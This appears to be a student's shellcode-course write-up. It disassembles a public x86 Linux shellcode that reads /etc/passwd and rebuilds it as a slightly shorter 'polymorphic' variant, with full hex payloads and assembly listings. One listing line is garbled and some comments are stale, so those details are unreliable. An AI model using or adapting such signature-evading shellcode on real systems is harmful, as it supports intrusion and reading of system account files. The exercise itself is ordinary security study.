# Shellcode - read /etc/passwd

[http://shell-storm.org/shellcode/files/shellcode-842.php](http://shell-storm.org/shellcode/files/shellcode-842.php)

```c
echo -n "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd\x80" | ndisasm -u -
```


# Disassembled

I have taken the disassembly and put it in a `.nasm` file format as  a starting point. I also marked some important values in comments.

```x86asm
global _start

section .text
_start:
    xor ecx,ecx
    mul ecx
    mov al,0x5      ; open()
    push ecx
    push dword 0x64777373       ; "dwss"
    push dword 0x61702f63       ; "ap/c"
    push dword 0x74652f2f       ; "te//"
    mov ebx,esp
    int 0x80

    xchg eax,ebx
    xchg eax,ecx
    mov al,0x3       ; read()
    xor edx,edx
    mov dx,0xfff
    inc edx
    int 0x80

    xchg eax,edx
    xor eax,eax
    mov al,0x4          ; write()
    mov bl,0x1      ; STDOUT
    int 0x80


    xchg eax,ebx        ; mov 0x1 into eax, exit()
    int 0x80t 0x80

```

# Changes

Since my goal was to reduce the number of bytes for extra credit, I did not change too many things, but the code is polymorphic and differs from the original.

First, I just changed the string that is pushed to the stack from `//etc/passwd` to `/etc//passwd`.

```x86asm
; push dword 0x61702f63       ; "ap/c"
; push dword 0x74652f2f       ; "te//"
push dword 0x61702f2f       ; "ap/c"
push dword 0x6374652f       ; "te//"
```

I then removed the `xor` to clear `edx` as it should have been cleraed from the previous `xor ecx, ecx; mul ecx` instructions. This saves me two bytes from the original shellcode in total length.

```x86asm
; xor edx,edx       
; edx is already cleared from `mul` instruction above 
```

Instead of moving `0xfff` into `dx` and incrementing, I move `0x1001` into `dx` and decrement.

```x86asm
; mov dx,0xfff
; inc edx
mov dx, 0x1001
dec edx
```

Here I change an `xor` with a `sub`. This may not work on all operating systems.

```x86asm
; xor eax,eax
sub eax, eax
```

I then change an `xchg` to a `mov` instruction for the exit() syscall. Since I have removed 2 bytes from the shellcode up until now, this instruction adds one extra byte from the original and places me one byte less than the original for my final shellcode.


```x86asm
; xchg eax,ebx        ; mov 0x1 into eax, exit()
mov al, 0x1
```

# Final Shellcode

```x86asm
global _start

section .text
_start:
    xor ecx,ecx
    mul ecx

    mov al,0x5      ; open()
    push ecx
    push dword 0x64777373       ; "dwss"
    ; push dword 0x61702f63       ; "ap/c"
    ; push dword 0x74652f2f       ; "te//"
    push dword 0x61702f2f       ; "ap/c"
    push dword 0x6374652f       ; "te//"
    
    mov ebx,esp
    int 0x80

    xchg eax,ebx
    xchg eax,ecx
    mov al,0x3       ; read()

    ; xor edx,edx       
    ; edx is already cleared from `mul` instruction above 

    ; mov dx,0xfff
    ; inc edx
    mov dx, 0x1001
    dec edx

    int 0x80

    xchg eax,edx

    ; xor eax,eax
    sub eax, eax
    
    mov al,0x4          ; write()
    mov bl,0x1        ; STDOUT
    int 0x80

    ; xchg eax,ebx        ; mov 0x1 into eax, exit()
    mov al, 0x1

    int 0x80
```

Final Shellcode: 

```c
"\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\xcd\x80\x93\x91\xb0\x03\x66\xba\x01\x10\x4a\xcd\x80\x92\x29\xc0\xb0\x04\xb3\x01\xcd\x80\xb0\x01\xcd\x80"
```

Original shellcode length: 51 bytes

My shellcode length: 50 bytes